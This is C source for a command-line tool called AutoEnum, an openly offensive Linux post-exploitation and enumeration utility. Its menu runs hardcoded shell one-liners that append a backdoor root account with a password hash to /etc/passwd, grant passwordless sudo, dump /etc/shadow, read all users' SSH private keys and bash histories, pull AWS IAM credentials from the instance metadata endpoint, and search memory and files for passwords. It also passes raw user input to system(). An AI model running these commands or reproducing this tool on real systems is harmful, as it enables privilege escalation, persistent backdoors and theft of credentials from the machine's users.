/*
AutoEnum
5/20/21
Made by: https://github.com/0x1CA3
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void red() 
{
  printf("\033[0;35m");
}

void color1() 
{
  printf("\033[1;33m");
}

void normal() 
{
  printf("\033[0m");
}

int terminalz()
{
    char ques[100];                        
    printf("\nEnter the command you want to execute > ");
    scanf("%s", ques);
    if (strcmp(ques, "back") == 0)
    {
        system("clear");
        onelinerz();
    }
    system(ques);
    terminalz();
    return 0;
}

int onelinerz()
{
    char oneliner[100];    
    printf("\n\nAutoEnum > ");
    scanf("%s", oneliner);
    if (strcmp(oneliner, "list") == 0)
    {
        red();
        printf("\nOne-Liner                                         Description");
        printf("\n---------                                         -----------");
        printf("\nlinux/bash/exploit_docker_bash_container          Allows you to edit /etc/passwd as root, then add a backdoor account. [toor:password]");
        printf("\nlinux/bash/exploit_writeable_sudoers              If you find a writable /etc/sudoers file, executing this command will allow you to use SUDO without password.");
        printf("\nlinux/bash/find_suid                              Detects files with SUID bit set, starting from '/'. [Useful for privilege escalation]");
        printf("\nlinux/bash/get_apache_site_enabled                Read all apache 'site-enabled' directory files.");
        printf("\nlinux/bash/get_aws_security_credentials           Useful if you are on a server with amazon cloud service running or exploiting SSRF.           ");
        printf("\nlinux/bash/get_bash_history_for_all_user          Read bash history files for all users.");
        printf("\nlinux/bash/get_last_edited_files                  Get files that were edited in the last 10 minutes.");
        printf("\nlinux/bash/get_ssh_private_keys_for_all_users     Read all private ssh keys for all users.");
        printf("\nlinux/bash/list_all_capabilities                  List all capabilities for all binaries. [Even ones outside bin folder]");
        printf("\nlinux/bash/list_cronjobs_for_all_users            List all crob jobs for all users in the system. [Needs root]");
        printf("\nlinux/bash/list_cronjobs_for_current_user         List all crob jobs for current user.");
        printf("\nlinux/bash/list_systemd_timers                    List all timers for systemd using systemctl.");
        printf("\nlinux/bash/search_for_password_in_memory          Search for 'password' string in memory.");
        printf("\nlinux/bash/search_for_password_using_find         Search for 'password' string in file contents using find.");
        printf("\nlinux/bash/search_for_password_using_grep         Search for 'password' string in file contents using grep.");
        printf("\nlinux/bash/search_for_writeable_folders_files     Search a directory for writeable files and directories using find.");
        normal();
        onelinerz();
    }
    else if (strcmp(oneliner, "options") == 0)
    {
        red();
        printf("\nCommands        Description");
        printf("\n--------        -----------");
        printf("\noptions         List help available commands.");
        printf("\nlist            Lists all available one-liners.");
        printf("\n[oneliner path] Executes a oneliner. To execute it, only put the oneliner path. Example: linux/bash/find_suid");
        printf("\ncommand         Execute a system command.");
        printf("\nclear           Clears the screen.");
        printf("\nexit            Exits out of AutoEnum.\n");
        normal();
        onelinerz();
    }
    else if (strcmp(oneliner, "clear") == 0)
    {
        system("clear");
        onelinerz();
    }
    else if (strcmp(oneliner, "command") == 0)
    {
        terminalz();
        onelinerz();
    }
    else if (strcmp(oneliner, "exit") == 0)
    {
        color1();
        printf("\n╔═══╗       H       ╔═══╗\n║╔═╗║    ___H___    ║╔══╝\n║║─║║╔╗╔╗|__O__|╔══╗║╚══╦═╗╔╗╔╦╗╔╗\n║╚═╝║║║║║  [']  ║╔╗║║╔══╣╔╗╣║║║╚╝║\n║╔═╗║║╚╝║  [.]  ║╚╝║║╚══╣║║║╚╝║║║║\n╚╝─╚╝╚══╝  [.]  ╚══╝╚═══╩╝╚╩══╩╩╩╝\n            V\nMade by https://github.com/0x1CA3 \n \nThanks for using my tool! :)");
        normal();
        system("exit");
    }
    else if (strcmp(oneliner, "linux/bash/exploit_docker_bash_container") == 0)
    {
        system("cd / && echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> etc/passwd");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/exploit_writeable_sudoers") == 0)
    {
        system("cd / && echo 'USERNAME ALL=(ALL) NOPASSWD: ALL' >>/etc/sudoers");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/find_suid") == 0)
    {
        system("find / -perm 4000 2>/dev/null");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/get_apache_site_enabled") == 0)
    {
        system("cat /etc/apache2/site-enabled/*");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/get_aws_security_credentials") == 0)
    {
        system("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/get_bash_history_for_all_user") == 0)
    {
        system("cat /home/*/.bash_history");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/get_last_edited_files") == 0)
    {
        system("find / -mmin -10 2>/dev/null | grep -Ev '^/proc'");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/get_ssh_private_keys_for_all_users") == 0)
    {
        system("cat /home/*/.ssh/id_rsa");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/list_all_capabilities") == 0)
    {
        system("getcap -r / 2>/dev/null");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/list_cronjobs_for_all_users") == 0)
    {
        system("for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/list_cronjobs_for_current_user") == 0)
    {
        system("crontab -l");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/list_systemd_timers") == 0)
    {
        system("systemctl list-timers --all");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/search_for_password_in_memory") == 0)
    {
        system("strings /dev/mem -n10 | grep -i PASS");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/search_for_password_using_find") == 0)
    {
        system("find . -type f -exec grep -i -I 'PASSWORD' {{}} /dev/null \\;");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/search_for_password_using_grep") == 0)
    {
        system("grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always 2> /dev/null");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else if (strcmp(oneliner, "linux/bash/search_for_writeable_folders_files") == 0)
    {
        system("find / -perm -o+w");
        printf("\nOne-liner executed!");
        onelinerz();
    }
    else
    {
        printf("\nError, command [%s] was not found.", oneliner);
        onelinerz();
    }
    return 0;
}

/*
Credits to https://github.com/D4Vinci/ for the one-liners. [Most of them, will be adding my own soon.]
*/

int main(int argc, char **argv)
{
    color1();
    printf("\n╔═══╗       H       ╔═══╗\n║╔═╗║    ___H___    ║╔══╝\n║║─║║╔╗╔╗|__O__|╔══╗║╚══╦═╗╔╗╔╦╗╔╗\n║╚═╝║║║║║  [']  ║╔╗║║╔══╣╔╗╣║║║╚╝║\n║╔═╗║║╚╝║  [.]  ║╚╝║║╚══╣║║║╚╝║║║║\n╚╝─╚╝╚══╝  [.]  ╚══╝╚═══╩╝╚╩══╩╩╩╝\n            V\nMade by https://github.com/0x1CA3 \nUsage: ./main [-h]\n");
    normal();
    char argsss;

    for (argsss = 0; argsss < argc; argsss++)
    {
        char const *userinput = argv[argsss];
        if (userinput[0] == '-')
        {
            switch (userinput[1])
            {
                case 'h':
                    red();
                    printf("\nCommands        Description");
                    printf("\n--------        -----------");
                    printf("\n-h              Prints out available commands.");
                    printf("\n-o              Loads extra options for gathering information on a Linux machine.");
                    printf("\n-e              Enumerates the machine. [Linux]");
                    printf("\n-w              Enumerates the machine. [Windows]");
                    printf("\n-p              Dumps the password hashes of all the users. [Make sure you're root]");
                    printf("\n-l              Loads a menu of one-liners for enumeration. [Linux]");
                    normal();
                    break;
                case 'o':
                    red();
                    printf("\nCommands        Description");
                    printf("\n--------        -----------");
                    printf("\n-a              Dumps etc/passwd.");
                    printf("\n-m              Dumps information about the memory.");
                    printf("\n-c              Dumps information about the CPU.    ");
                    printf("\n-i              Displays some information about the machine.");
                    normal();
                    break;
                case 'm':
                    system("echo ");
                    system("cd / && cd proc && cat meminfo");
                    break;
                case 'i':
                    system("echo ");
                    system("cd / && cd proc && cat version");
                    break;
                case 'c':
                    system("echo ");
                    system("cd / && cd proc && cat cpuinfo");
                    break;
                case 'p':
                    system("cd / && cat etc/shadow");
                    break;
                case 'e':
                    system("echo ");
                    system("\necho Enumerating machine.......");
                    system("echo ");
                    system("whoami");
                    system("id");
                    system("ifconfig");
                    system("");
                    system("");
                    system("");
                    system("");
                    system("");
                    system("");
                    break;
                case 'w':
                    system("echo ");
                    system("\necho Enumerating machine.......");
                    break;
                case 'a':
                    system("echo ");
                    system("\ncd / && cat etc/passwd");
                    break;
                case 'l':
                    red();
                    printf("\nOne-Liner                                         Description");
                    printf("\n---------                                         -----------");
                    printf("\nlinux/bash/exploit_docker_bash_container          Allows you to edit /etc/passwd as root, then add a backdoor account. [toor:password]");
                    printf("\nlinux/bash/exploit_writeable_sudoers              If you find a writable /etc/sudoers file, executing this command will allow you to use SUDO without password.");
                    printf("\nlinux/bash/find_suid                              Detects files with SUID bit set, starting from '/'. [Useful for privilege escalation]");
                    printf("\nlinux/bash/get_apache_site_enabled                Read all apache 'site-enabled' directory files.");
                    printf("\nlinux/bash/get_aws_security_credentials           Useful if you are on a server with amazon cloud service running or exploiting SSRF.           ");
                    printf("\nlinux/bash/get_bash_history_for_all_user          Read bash history files for all users.");
                    printf("\nlinux/bash/get_last_edited_files                  Get files that were edited in the last 10 minutes.");
                    printf("\nlinux/bash/get_ssh_private_keys_for_all_users     Read all private ssh keys for all users.");
                    printf("\nlinux/bash/list_all_capabilities                  List all capabilities for all binaries. [Even ones outside bin folder]");
                    printf("\nlinux/bash/list_cronjobs_for_all_users            List all crob jobs for all users in the system. [Needs root]");
                    printf("\nlinux/bash/list_cronjobs_for_current_user         List all crob jobs for current user.");
                    printf("\nlinux/bash/list_systemd_timers                    List all timers for systemd using systemctl.");
                    printf("\nlinux/bash/search_for_password_in_memory          Search for 'password' string in memory.");
                    printf("\nlinux/bash/search_for_password_using_find         Search for 'password' string in file contents using find.");
                    printf("\nlinux/bash/search_for_password_using_grep         Search for 'password' string in file contents using grep.");
                    printf("\nlinux/bash/search_for_writeable_folders_files     Search a directory for writeable files and directories using find.");
                    printf("\n\n[Use 'options' for commands.]\n");
                    normal();
                    onelinerz();
                    break;
                case '-':
                    printf("");
                default:
                    red();
                    printf("\nError! [%s] was not found.", userinput);
                    break;
            }
        }
        else
        {   
            printf("");
        }
     }
  return 0;
}